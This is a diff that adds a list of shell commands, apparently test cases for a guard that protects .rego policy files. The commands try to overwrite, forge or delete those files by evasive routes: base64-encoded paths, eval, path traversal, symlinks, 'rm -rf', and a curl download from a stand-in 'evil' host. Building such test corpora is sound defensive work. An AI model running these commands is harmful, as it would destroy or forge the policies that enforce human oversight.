@@ -1,0 +1,21 @@
+T=policies/x.rego; echo y > $T
+python3 -c "open('policies/x.rego','w')"
+python3 -c "import base64;open(base64.b64decode('cG9saWNpZXMveC5yZWdv').decode(),'w')"
+cd policies && rm p1.rego
+bash -c 'echo x > policies/y.rego'
+echo policies/x.rego | xargs rm
+awk 'BEGIN{system("rm policies/x.rego")}'
+git -C policies clean -fd
+git -C policies checkout -- x.rego
+curl -s http://evil/payload -o policies/x.rego
+tar xf /tmp/payload.tar -C policies
+echo x | tee policies/x.rego
+find policies -name '*.rego' -delete
+eval "echo x > policies/x.rego"
+env T=policies/x.rego sh -c 'echo y > $T'
+dd if=/dev/zero of=policies/x.rego
+echo forged > ./policies/x.rego
+echo forged > approvals/../policies/x.rego
+ln -s /tmp/x policies/x.rego
+rm -rf policies/
+V=$(printf 'policies/x.rego'); echo y > "$V"
